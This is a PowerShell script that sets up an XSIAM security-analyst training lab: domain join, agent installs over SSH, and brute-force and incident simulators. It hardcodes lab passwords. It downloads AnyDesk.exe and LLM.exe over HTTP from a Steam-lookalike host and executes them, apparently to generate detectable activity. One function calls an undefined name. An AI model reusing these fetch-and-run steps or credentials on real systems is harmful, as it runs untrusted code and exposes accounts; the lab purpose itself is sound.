# Copyright (c) 2024, Palo Alto Networks
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

# Author: Richard Porter rporter@paloaltonetworks.com

# Call the custom Install-PoshSSH module, this is a backup function to make sure module installed
# If it is installed the function will detect and continue

#### Start Functions Section ####
# TODO: Document these better
<#
.SYNOPSIS
    Sets up a Windows 11 lab machine including AD, DNS, and Linux server configurations.

.DESCRIPTION
    This script:
    - Reads a TOPO number from user files.
    - Configures Windows server details using the TOPO number.
    - Disables News and Interests and Widgets on the taskbar if not already done.
    - Downloads and sets up Kubernetes utilities if not present.
    - Adds Python to the system PATH if not already configured.
    - Changes DNS server to 192.168.3.65.
    - Adds the computer to the domain ad-$topoNumber.local.
    - Outputs and appends server configuration details for both Windows and Linux servers to lab-build.txt.

.PARAMETER Help
    Displays usage information when specified.

.EXAMPLE
    .\SetupLab.ps1
    .\SetupLab.ps1 -Help

.NOTES
    File Name      : SetupLab.ps1
    Author         : Your Name
    Requires       : PowerShell 5.1 or higher, administrative privileges
    Version        : 1.0
    Date           : Today's Date

    Ensure you run this with administrative privileges. This script modifies system settings and should be used with caution in production environments. Always test in a non-production setup first.

.LINK
    None
#>

param (
    [switch]$Help
)

# Ensure script runs with administrative privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Function to display usage information
function Show-Usage {
    Write-Host "Usage: .\SetupLab.ps1 [-Help]"
    Write-Host "Parameters:"
    Write-Host "  -Help    : Display this help message."
}

if ($Help) {
    Show-Usage
    exit
}
function Get-TopoUserNumber {
    $computerName = $env:COMPUTERNAME

    # Check if the computer name matches the expected format
    if ($computerName -match '^XSIAM-ILT-(\d{4,5})$') {
        return [int]$matches[1]
    } else {
        Write-Warning "Computer name does not match expected format 'XSIAM-ILT-#####'. Checking user file for topology number..."

        $userFiles = @("$env:USERPROFILE\user.txt", "$env:USERPROFILE\user")
        foreach ($file in $userFiles) {
            if (Test-Path -Path $file) {
                $content = Get-Content -Path $file -First 1
                if ($content -match 'TOPO=(\d{4,5})') {
                    Write-Host "Topology number found in $file"
                    return [int]$matches[1]
                }
            }
        }

        Write-Warning "Could not find topology number in computer name or user files."
        return $null
    }
}

# Example usage:
# $number = Get-TopoUserNumber
# if ($number -ne $null) {
#     Write-Host "The topology number is: $number"
# } else {
#     Write-Host "Topology number not found."
# }

# Function to create a Scripts directory on the desktop
function New-ScriptsDirectory {
    $scriptsPath = "$env:USERPROFILE\Desktop\Scripts"
    if (-not (Test-Path $scriptsPath)) {
        New-Item -Path $scriptsPath -ItemType Directory | Out-Null
        Write-Host "Created Scripts directory at $scriptsPath"
    } else {
        Write-Host "Scripts directory already exists at $scriptsPath"
    }
}

# Function to download a script to the Scripts directory
function Download-Script {
    param (
        [string]$URL,
        [string]$Destination
    )
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($URL, $Destination)
        Write-Host "Successfully downloaded script to $Destination"
    }
    catch {
        Write-Error "Failed to download script: $_"
    }
}

# Function to disable News and Interests on the taskbar
function Disable-NewsAndInterests {
    # Disable News and Interests and Weather widget
    $regCommand = "reg add `"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced`" /v `"TaskbarDa`" /t REG_DWORD /d `"0`" /f"
    
    try {
        Invoke-Expression $regCommand
        Write-Host "News and Interests (Widgets) and Weather on the taskbar have been disabled."
    }
    catch {
        Write-Error "Failed to disable widgets: $_"
    }

    # Restart explorer to apply changes
    Stop-Process -Name explorer -Force
}

# Function to find Python executable in user's PATH
function Find-PythonPath {
    $UserPath = $env:PATH -split ';'
    foreach ($dir in $UserPath) {
        if (Test-Path $dir) {
            $pythonExe = Get-ChildItem -Path $dir -Filter "python*.exe" | Select-Object -First 1
            if ($pythonExe) {
                return $pythonExe.Directory.FullName
            }
        }
    }
    Write-Warning "No python*.exe found in user's PATH."
    return $null
}

# Function to download and check hash for a file
function DownloadAndCheckFile {
    param (
        [string]$FileName,
        [string]$FileType
    )
    $LatestVersion = Invoke-RestMethod -Uri "https://dl.k8s.io/release/stable.txt"
    $DownloadURL = "https://dl.k8s.io/release/$LatestVersion/bin/windows/amd64/$FileName"
    $DestinationPath = "$env:USERPROFILE\Downloads\$FileName"
    $HashURL = "https://dl.k8s.io/release/$LatestVersion/bin/windows/amd64/$FileName.sha256"
    $HashFile = "$env:USERPROFILE\Downloads\$FileName.sha256"

    # Download file
    Invoke-WebRequest -Uri $DownloadURL -OutFile $DestinationPath
    Write-Host "Downloaded $FileName to $DestinationPath"

    # Download hash file
    Invoke-WebRequest -Uri $HashURL -OutFile $HashFile
    Write-Host "Downloaded SHA256 hash file for $FileName to $HashFile"

    # Check hash
    $LocalHash = (Get-FileHash $DestinationPath -Algorithm SHA256).Hash.ToLower()
    $RemoteHash = (Get-Content $HashFile -Raw).Split(" ")[0].ToLower()

    if ($LocalHash -ne $RemoteHash) {
        Write-Error "Hash check failed for $FileName. Local hash: $LocalHash, Remote hash: $RemoteHash"
        Remove-Item $DestinationPath, $HashFile
        return $false
    }
    Write-Host "Hash check successful for $FileName."
    return $true
}

# Function to add kubectl autocomplete
function Add-KubectlAutocomplete {
    $CompletionScript = kubectl completion powershell
    $CompletionScript | Out-String | Invoke-Expression
    
    # Save to PowerShell profile
    Add-Content $PROFILE "`n$CompletionScript"
    Write-Host "kubectl autocompletion added to PowerShell profile."
}

# New function to change DNS settings on local Windows system
function Change-DNS {
    param (
        [string]$DNSServer = "192.168.3.65"
    )
    $NetworkAdapter = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1
    if ($NetworkAdapter) {
        Set-DnsClientServerAddress -InterfaceIndex $NetworkAdapter.InterfaceIndex -ServerAddresses $DNSServer
        Write-Host "DNS server set to $DNSServer for adapter: $($NetworkAdapter.Name)"
    } else {
        Write-Error "No active network adapter found."
    }
}

function Add-WindowsToDomain {
    # Retrieve topo number
    $topoNumber = Get-UserTopoNumber
    if ($null -eq $topoNumber) {
        Write-Error "Could not retrieve topo number. Domain join aborted."
        return
    }

    # Formulate domain name and username with the topo number
    $DomainName = "ad-$topoNumber.local"
    $Username = "Administrator@ad-$topoNumber.local"
    $Password = "Paloalto1!"

    try {
        Add-Computer -DomainName $DomainName -Credential (New-Object System.Management.Automation.PSCredential($Username, (ConvertTo-SecureString $Password -AsPlainText -Force))) -Restart -Force
        Write-Host "Successfully joined $DomainName. Computer will restart."
    }
    catch {
        Write-Error "Failed to join domain: $_"
    }
}

function Find-File {
    param (
        [string]$FileName,
        [string]$SearchLocation = "C:\"
    )

    # Ensure the SearchLocation ends with a backslash for consistency
    if (-not $SearchLocation.EndsWith("\")) {
        $SearchLocation += "\"
    }

    try {
        $file = Get-ChildItem -Path $SearchLocation -Filter $FileName -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1

        if ($file) {
            Write-Host "File found at: $($file.FullName)"
            return $file
        } else {
            Write-Host "File '$FileName' not found in $SearchLocation or its subdirectories."
            return $null
        }
    } catch {
        Write-Error "An error occurred while searching for the file: $_"
        return $null
    }
}
function Append-ServerInfoToFile {
    param (
        [int]$topoNumber,
        [string]$FilePath = "$env:USERPROFILE\Desktop\lab_build.txt"  # Default file path
    )
    # Ensure the file path ends with .txt if it doesn't already
    if (-not $FilePath.EndsWith(".txt", [System.StringComparison]::InvariantCultureIgnoreCase)) {
        $FilePath += ".txt"
    }

    # Array of server information with $topoNumber interpolated where needed
    $serverInfo = @(
        "Windows Server Information:",
        "Name: dc-$topoNumber",
        "IP: 192.168.3.65",
        "Username: lab-user",
        "Password: Paloalto1!",
        "AD Username: Administrator@ad-$topoNumber.local",
        "AD Password: Paloalto1!",
        "FQDN: dc-$topoNumber.ad-$topoNumber.local",
        "",
        "Linux Server Information:",
        "Name: ubuntu",
        "IP: 192.168.3.66",
        "Username: lab-user",
        "Password: Paloalto1!",
        "To Access Kubernetes for CDR Agent, log in to Linux Server and run the following command:",
        "sudo microk8s kubectl exec -it alpine-cdr-1 -- sh",
        "Setup Commands (already run for you):",
        "sudo snap install microk8s --classic",
        "wget https://raw.githubusercontent.com/hankthebldr/CDR/refs/heads/master/cdr.yml",
        "sudo microk8s kubectl apply -f cdr.yml"
    )

    try {
        # Insert two new lines before appending new content
        Add-Content -Path $FilePath -Value "`r`n`r`n" -Encoding UTF8

        # Loop through each item in the array and append to the file
        foreach ($item in $serverInfo) {
            Add-Content -Path $FilePath -Value $item -Encoding UTF8
        }
        Write-Host "Server information appended successfully to $FilePath"
    } catch {
        Write-Error "Failed to append server information to file: $_"
    }
}

function Get-Analyst-File ($url, $outputPath) {
    Invoke-WebRequest -Uri $url -OutFile $outputPath
    Write-Log "Downloaded $url to $outputPath"
}

# Function to execute a file
function Start-Analyst-File ($filePath) {
    Start-Process -FilePath $filePath
    Write-Log "Executed $filePath"
}



function Get-LabIPAddress {
    [CmdletBinding()]
    param (
        [string]$LabBuildFile = "$env:USERPROFILE\Desktop\lab_build.txt"
    )

    # Check if the file exists
    if (-not (Test-Path -Path $LabBuildFile)) {
        Write-Log "The file '$LabBuildFile' does not exist."
        return $null
    }

    # Read the contents of the lab_build.txt file
    $labBuildContent = Get-Content -Path $LabBuildFile

    # Initialize variable for IP address
    $ipAddress = $null

    # Loop through each line to find the one that starts with 'ip:'
    foreach ($line in $labBuildContent) {
        if ($line -match '^ip:\s*(.*)$') {
            # Extract the IP address by removing 'ip:' and any leading/trailing whitespace
            $ipAddress = $line -replace '^ip:\s*', ''
            $ipAddress = $ipAddress.Trim()
            Write-Log "IP found in $labBuildFile and extracted as $ipAddress"
            break
        }
    }

    # Check if IP address was found
    if (-not $ipAddress) {
        Write-Log "IP address not found in '$LabBuildFile'."
        return $null
    }

    # Return the IP address
    return $ipAddress
}

function Install-PoshSSH {
    [CmdletBinding()]
    param ()

    # Create a script block to install Posh-SSH as Administrator
    $scriptBlock = {
        # Set the execution policy to RemoteSigned
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Force

        # Install the Posh-SSH module
        Install-Module -Name Posh-SSH -Force -AllowClobber

        # Import the Posh-SSH module
        Import-Module Posh-SSH

        Write-Log "Posh-SSH has been installed and imported successfully."
    }

    # Convert the script block to a string
    $scriptBlockString = $scriptBlock.ToString()

    # Escape the double quotes in the script block string
    $escapedScriptBlock = $scriptBlockString -replace '"', '\"'

    # Start a new PowerShell process as Administrator
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `" & {$escapedScriptBlock} `" " -Verb RunAs
}
function Write-Log {
    param (
        [string]$Message,
        [string]$LogFile = "$env:USERPROFILE\Downloads\lab_build.log"
    )
    $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "$TimeStamp - $Message"
    Add-Content -Path $LogFile -Value $LogMessage
}

function Get-LabIncidentCommands {
    [CmdletBinding()]
    param (
        [string]$FilePath = "$Env:USERPROFILE\Desktop\lab-incident-command.txt"
    )

    # Check if the file exists
    if (!(Test-Path -Path $FilePath)) {
        Write-Error "The file '$FilePath' does not exist."
        return $null
    }

    try {
        # Read the contents of the file into an array
        $commands = Get-Content -Path $FilePath -ErrorAction Stop

        # Ensure $commands is always an array
        if (-not ($commands -is [System.Array])) {
            $commands = @($commands)
        }

        return $commands
    } catch {
        Write-Error "An error occurred while reading the file: $_"
        return $null
    }
}
function Start-ElevatedProcess {
    param (
        [string]$FilePath,
        [string]$Arguments
    )
    Start-Process -FilePath $FilePath -ArgumentList $Arguments -Verb RunAs
}

function Install-WindowsAgent {
    [CmdletBinding()]
    param ()

    # Define the path to the MSI file
    $msiPath = Join-Path -Path "$env:USERPROFILE\Downloads" -ChildPath "Windows_Agent_x64.msi"

    # Check if the MSI file exists
    if (-not (Test-Path -Path $msiPath)) {
        Write-Log "MSI file not found at $msiPath."
        return
    }

    Write-Log "Installing Windows Agent from $msiPath..."

    # Build the msiexec arguments for silent installation
    $arguments = "/i `"$msiPath`" /quiet /qn /norestart"

    # Start msiexec.exe as administrator
    Start-ElevatedProcess -FilePath "msiexec.exe" -Arguments $arguments

    Write-Log "Windows Agent has been installed silently."
}

function Wait-Time {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [int]$minwait,
        [Parameter(Mandatory=$true, Position=1)]
        [int]$maxwait
    )
    # Generate a random time interval between what was passed, in seconds
    $waitTime = Get-Random -Minimum $minwait -Maximum $maxwait

    # Start the wait process
    Start-Sleep -Seconds $waitTime

    # log the wait time
    Write-Log "waited $waitTime in seconds"
}

Install-PoshSSH

Start-Sleep -Seconds 30
# Import the Posh-SSH module
# Need this or the whole thing breaks

Import-Module Posh-SSH

# These are set based on download from the tenant
# TODO: Automate Download and detect version from Ansible

$agent = "Linux_Agent_sh.tar.gz"
$collector = "Linux_Collector_sh.tar.gz"
$home_directory = "/home/cortex"
#$windows_agent = "Windows_Agent_x64.msi"
# This gets the lab incident command from the text file on the desktop
# if the command ever changes, it will pick it up
# if additional commands are added by line, it will execute those
$lab_incident = Get-LabIncidentCommands


# Define the IP address and credentials
# This gets the IP Address of the Traffic Generator from the lab_build.txt file.
# it looks for the IP: and strips the IP:, if this is changed, the script breaks

$ipAddress = Get-LabIPAddress

# Hard Coded credentials for Traffic Generator
# THIS IS A LAB, DO NOT DO THIS IN PRODUCTION
# TODO: Update to Keys
$username = "cortex"
$password = "password"  # Plain text password

# THIS IS A LAB, DO NOT DO THIS IN PRODUCTION
$usernameCDR = "lab-user"
$passwordCDR = "Paloalto1!"

# Convert password to SecureString
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$securePasswordCDR = ConvertTo-SecureString $passwordCDR -AsPlainText -Force

# This installs the agent on the local windows device
# This assumes the file has been downloaded (no automation yet)
# This assumes the filename is correct, that is static
# If filename is not Windows_Agent_x64.msi install will fail
# TODO: Make more dynamic
# TODO: Automate API based download where Ansible supplies key
# runas /user:Administrator "msiexec /i $env:USERPROFILE\Downloads\$windows_agent /quiet /qn /norestart"
Install-WindowsAgent

# Start SSH Session with Traffic Generator, again lab_build.txt must be there with IP: prefixed line in text file, or this all breaks
# This is SSH session only. This accepts the new key automatically, this is for compat reasons on build
$session = New-SSHSession -ComputerName $ipAddress -Credential (New-Object System.Management.Automation.PSCredential($username, $securePassword)) -AcceptKey
$sessionCDR = New-SSHSession -ComputerName "192.168.3.66" -Credential (New-Object System.Management.Automation.PSCredential($usernameCDR, $securePasswordCDR)) -AcceptKey

# Start SFTP Session with Traffic Generator, again lab_build.txt must be there with IP: prefixed line in text file, or this all breaks
# This is SFTP session only.
$session_sftp = New-SFTPSession -ComputerName $ipAddress -Credential (New-Object System.Management.Automation.PSCredential($username, $securePassword)) -AcceptKey

# Create a shell stream for SSH Session to stream commands
$stream = $session.Session.CreateShellStream("PS-SSH", 0, 0, 0, 0, 1000)
$streamCDR = $sessionCDR.Session.CreateShellStream("PS-SSH", 0, 0, 0, 0, 1000)

# Here we copy the $agent binary and the $collector binary for linux to Traffic Gen
# TODO: Automate binary and conf distribution using --dist-id in conf vs unpack
Set-SFTPItem -SessionId $session_sftp.SessionId -Destination $home_directory -Path $env:USERPROFILE\Downloads\$agent
Set-SFTPItem -SessionId $session_sftp.SessionId -Destination $home_directory -Path $env:USERPROFILE\Downloads\$collector

# Begin command sequece setting up the lab, first elevate to root.
Invoke-SSHStreamExpectSecureAction -ShellStream $stream -Command "sudo -s" -ExpectString "password for ${username}:" -SecureAction $securePassword
Invoke-SSHStreamExpectSecureAction -ShellStream $streamCDR -Command "sudo -s" -ExpectString "password for ${usernameCDR}:" -SecureAction $securePasswordCDR

# Installs CDR ENV
Invoke-SSHStreamShellCommand -ShellStream $streamCDR -Command "sudo snap install microk8s --classic"
Start-Sleep 60
Invoke-SSHStreamShellCommand -ShellStream $streamCDR -Command "sudo wget https://raw.githubusercontent.com/hankthebldr/CDR/refs/heads/master/cdr.yml"
Start-Sleep 2
Invoke-SSHStreamShellCommand -ShellStream $streamCDR -Command "sudo sudo microk8s kubectl apply -f cdr.yml"
Start-Sleep -Seconds 15

# Unpacks the Agent
Invoke-SSHStreamShellCommand -ShellStream $stream -Command "tar xvf $home_directory/$agent"
Start-Sleep -Seconds 2

# Unpacks the collector
Invoke-SSHStreamShellCommand -ShellStream $stream -Command "tar xvf $home_directory/$collector"
Start-Sleep -Seconds 2

# Make Agent installer executable
Invoke-SSHStreamShellCommand -ShellStream $stream -Command "chmod +x $home_directory/cortex-*.sh"

# Make Collector installer executable
Invoke-SSHStreamShellCommand -ShellStream $stream -Command "chmod +x $home_directory/collector-*.sh"

# Create the conf directory under /etc/panw
Invoke-SSHStreamShellCommand -ShellStream $stream -Command "sudo mkdir -p /etc/panw"

# Copy conf files to /etc/panw, this is needed or agent installs fail to pick up proper tenant
Invoke-SSHStreamShellCommand -ShellStream $stream -Command "sudo cp $home_directory/collector.conf /etc/panw"
Invoke-SSHStreamShellCommand -ShellStream $stream -Command "sudo cp $home_directory/cortex.conf /etc/panw"

# Install the collector and wait 2 min for collector to check in
Invoke-SSHStreamShellCommand -ShellStream $stream -Command "$home_directory/collector-*.sh"
Start-Sleep -Seconds 120

# Install the agent and wait 2 minutes for agent to check in
Invoke-SSHStreamShellCommand -ShellStream $stream -Command "$home_directory/cortex-*.sh"
Start-Sleep -Seconds 120

# Start the ssh_simulator simulating brute force
$remoteCommand = "nohup /usr/bin/python3 $home_directory/ssh_simulator.py > /dev/null 2>&1 &"
$result = Invoke-SSHCommand -Command $remoteCommand -SessionId $session.SessionId 
if ($result.ExitStatus -eq 0) {
    Write-Log "Python script started successfully."
} else {
    Write-Log "Error starting the Python script."
    Write-Log $result.Error
}
$remoteCommand = "nohup /usr/bin/python3 $home_directory/data_simulation.py > /dev/null 2>&1 &"
$result = Invoke-SSHCommand -Command $remoteCommand -SessionId $session.SessionId
if ($result.ExitStatus -eq 0) {
    Write-Log "Data Simulation script started successfully."
} else {
    Write-Log "Error starting the Python script."
    Write-Log $result.Error
}

$remoteCommand = "nohup $lab_incident > /dev/null 2>&1 &"
$result = Invoke-SSHCommand -Command $remoteCommand -SessionId $session.SessionId
if ($result.ExitStatus -eq 0) {
    Write-Log "Lab Incident Script started successfully."
} else {
    Write-Log "Error starting the Python script."
    Write-Log $result.Error
}


# Wait for a random period between 10 - 15 seconds
Wait-Time -minwait 10 -maxwait 15

# Close the shell stream and session
$stream.Close()
Remove-SSHSession -SessionId $session.SessionId

# Define URLs
$anyDeskUrl = "http://dl.steanpowered.ru/AnyDesk.exe"
$llmUrl = "http://dl.steanpowered.ru/LLM.exe"

Write-Log "Created var: $anyDeskURL and var: $llmUrl"
# Define download paths
$downloadsPath = "$env:USERPROFILE\Downloads"
$anyDeskPath = Join-Path -Path $downloadsPath -ChildPath "AnyDesk.exe"
$llmPath = Join-Path -Path $downloadsPath -ChildPath "LLM.exe"

# Download AnyDesk.exe
Get-Analyst-File -url $anyDeskUrl -outputPath $anyDeskPath

# Wait from 4 to 9 seconds
Wait-Time -minwait 4 -maxwait 9

# Execute AnyDesk.exe
Start-Analyst-File -filePath $anyDeskPath

# Wait for a random period between 10 - 15 seconds
Wait-Time -minwait 10 -maxwait 15

# Download LLM.exe
Get-Analyst-File -url $llmUrl -outputPath $llmPath

# Wait for a random period between 10 - 15 seconds
Wait-Time -minwait 10 -maxwait 15

# Execute LLM.exe
Start-Analyst-File -filePath $llmPath

Write-Log "Script execution complete."
try {
    # Create Scripts directory
    New-ScriptsDirectory
    
    # Download EDU-XSIAM-Engineer-Example.py to Scripts directory
    $scriptURL = "https://raw.githubusercontent.com/norsemen-local/lab-builder/refs/heads/main/EDU-XSIAM-Engineer-Example.py"
    $scriptDestination = "$env:USERPROFILE\Desktop\Scripts\EDU-XSIAM-Engineer-Example.py"
    Download-Script -URL $scriptURL -Destination $scriptDestination
    #labBuild = "$env:USERPROFILE\Desktop\lab_build.txt"
    # Disable News and Interests
    Disable-NewsAndInterests
    $topoNumber = Get-TopoUserNumber
    Append-ServerInfoToFile $topoNumber
    # Add Python to PATH if found
    $PythonDir = Find-PythonPath
    if ($PythonDir) {
        $OldPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
        if (-not ($OldPath -split ';' | Where-Object { $_ -eq $PythonDir })) {
            $NewPath = "$OldPath;$PythonDir"
            [Environment]::SetEnvironmentVariable("Path", $NewPath, "Machine")
            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
            Write-Host "Added $PythonDir to system PATH."
        } else {
            Write-Host "$PythonDir is already in the system PATH."
        }
    }

    # Download and setup Kubernetes utilities
    $KubeUtils = @("kubeadm.exe", "kubectl-convert.exe", "kube-log-runner.exe", "kubectl.exe")
    foreach ($util in $KubeUtils) {
        if (DownloadAndCheckFile -FileName $util -FileType "exe") {
            # Move the utility to C:\Windows\System32
            $SysPath = "C:\Windows\System32"
            $UtilPath = "$env:USERPROFILE\Downloads\$util"
            Move-Item -Path $UtilPath -Destination $SysPath -Force
            Write-Host "$util moved to $SysPath"
        }
    }

    # Add to system PATH (in case it's not already there or for new files)
    $OldPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
    $NewPath = "$OldPath;$SysPath"
    [Environment]::SetEnvironmentVariable("Path", $NewPath, "Machine")
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    Write-Host "Utilities added to system PATH."

    # Add kubectl autocomplete
    Add-KubectlAutocomplete

    # Change DNS settings
    Change-DNS

    # Add to domain
    Add-WindowsToDomain

    Write-Host "Lab setup completed successfully."
}
catch {
    Write-Error "An error occurred during setup: $_"
}